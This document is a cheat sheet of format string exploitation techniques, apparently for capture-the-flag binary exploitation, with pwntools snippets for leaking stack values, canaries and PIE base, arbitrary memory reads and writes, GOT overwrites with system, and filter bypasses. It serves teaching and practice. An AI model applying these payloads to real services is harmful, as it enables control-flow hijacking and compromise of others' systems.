# Format String Exploitation

## Stack Leak
```python
# IN: send_func, recv_func  OUT: stack values at positions 1–20
for i in range(1, 21):
    send_func(f'%{i}$p'.encode())
    print(f"pos {i}: {recv_func()}")
```

## Find Input Offset
```python
# IN: send_func, recv_func  OUT: offset where your input appears on stack
send_func(b'AAAA%6$p.%7$p.%8$p.%9$p.%10$p')
# Look for 0x41414141 — that position is your offset
```

## Arbitrary Read
```python
# IN: target_addr, offset  OUT: memory contents at target_addr
# Trap: %s stops at null bytes; use %p for 8-byte integer reads
payload = p64(target_addr) + f'%{offset}$s'.encode()
send_func(payload)
leaked = recv_func()  # contains string at target_addr
```

## Arbitrary Write (pwntools — recommended)
```python
# IN: offset (your input's stack position), writes dict {addr: value}
from pwn import *
payload = fmtstr_payload(offset, {target_addr: desired_value})
send_func(payload)
# Verify: read back target_addr and check
```

## Arbitrary Write (manual, single byte)
```python
# Write byte VALUE to ADDR: print VALUE chars, then %hhn at the right position
# %hhn writes 1 byte (chars_printed mod 256)
# %hn writes 2 bytes, %n writes 4 bytes
```

## FmtStr Object (interactive / multi-shot)
```python
from pwn import *
def exec_fmt(payload):
    p = process('./binary'); p.sendline(payload); return p.recvall()
fmt = FmtStr(execute_fmt=exec_fmt, offset=6)
fmt.write(got_addr, system_addr)
fmt.execute_writes()
```

## Canary + PIE Leak
```python
# IN: canary_offset, pie_offset (stack positions)  OUT: canary, elf_base
send_func(f'%{canary_offset}$p.%{pie_offset}$p'.encode())
parts = recv_func().split(b'.')
canary = int(parts[0], 16)
elf_base = int(parts[1], 16) - known_offset
```

## Common Targets
| Target | Condition | Effect |
|---|---|---|
| GOT entry | Partial RELRO | Redirect function call |
| Return address | Know stack addr | Hijack flow |
| `__free_hook` / `__malloc_hook` | glibc < 2.34 | Called on free()/malloc() |
| `.fini_array` | Writable section | Called on exit |
| Global variable | Known address | Change program state |

## Filter Bypass
| Filter | Bypass |
|---|---|
| `%n` blocked | `%hn`, `%hhn`, `%ln` |
| Length limit | `%hhn` (1 byte per write), `%*N$c` for large padding |
| Positional `$` blocked | `%c%c%c...%n` to reach desired offset |

## Trap
`%n` family needs the target address ON the stack at the referenced position. In 64-bit, addresses contain null bytes — place the address AFTER the format specifiers, not before, and adjust the offset accordingly. `fmtstr_payload` handles this automatically.
